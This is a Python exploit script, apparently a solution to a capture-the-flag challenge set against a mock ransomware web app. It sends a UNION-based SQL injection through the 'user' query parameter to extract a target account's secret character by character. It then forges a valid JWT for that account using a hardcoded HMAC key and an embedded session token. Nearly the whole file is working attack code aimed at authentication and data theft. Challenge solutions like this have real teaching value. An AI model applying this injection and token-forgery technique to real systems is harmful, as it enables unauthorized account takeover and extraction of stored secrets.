import jwt, requests, re
from datetime import datetime, timedelta

TARGET_USER = "SoggyPlate"
TARGET_UID = 15861 # Found earlier while exploring, as seen in the writeup
URL = "https://xsafjadfhngjqmit.ransommethis.net/sfukthmjthqxfjdy"
HMAC_KEY = "xveZHYpG5qqmQeFCezjtof4ZrjCUab7l" # As seen in source code of app/util.py:

# Regular user token, generated in task 6
COOKIE = {'tok':'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzA1ODY1MTcsImV4cCI6MTcwMjEyMjUxNywidWlkIjoyODUwNCwic2VjIjoiWURHbDlPcjZDUDIyZGRBN2NROUFZMDE1UzNRbm5xbXMifQ.MSGaHtEjZ4CltPTRcGeq3TQi1E_HOWPoEoAyyrrg3n8'}


def generate_token(uid, sec):
	now = datetime.now()
	exp = now + timedelta(days=365)  # so we dont have to worry about it expiring
	claims = {
				'iat': now,
				'exp': exp,
				'uid': uid,
				'sec': sec
			}
	return jwt.encode(claims, HMAC_KEY, algorithm='HS256')

def getReturnFrom(params):
	response = requests.get(f'{URL}/userinfo?user={params}', cookies=COOKIE)

	try:
		return re.search('\d+', re.findall('p>[0-9]*<\/p', response.text)[2]).group(0) # Since we're we know we're only using the 3rd number, look for last num in boxes
	except:
		return 'Error'


if __name__ == '__main__':
	clientSecret = []
	# Get the secret by getting unicode value of each char
	for index in range(1, 33): # Known that secret length is 32, SQL starts at index 1
		result = getReturnFrom(f"' UNION SELECT 0, 0, 0, unicode(substr(secret, {index}, 1)) FROM Accounts WHERE userName='{TARGET_USER}' --")
		if "ERROR" in result:
			print("Error")
			break

		result = chr(int(result)) # unicode int to char

		print(f'Char {index} of client secret:\t {result}')

		if "ERROR" not in result:
			clientSecret.append(result)

	# Print the secret
	clientSecret = ''.join(clientSecret)
	print(f'\n[!] Retrieved client secret:\t{clientSecret}')

	# Generate token
	print(f'\n[*] Generating token with of "{TARGET_USER}" with uid: {TARGET_UID} and secret: {clientSecret}')
	print(generate_token(TARGET_UID, clientSecret))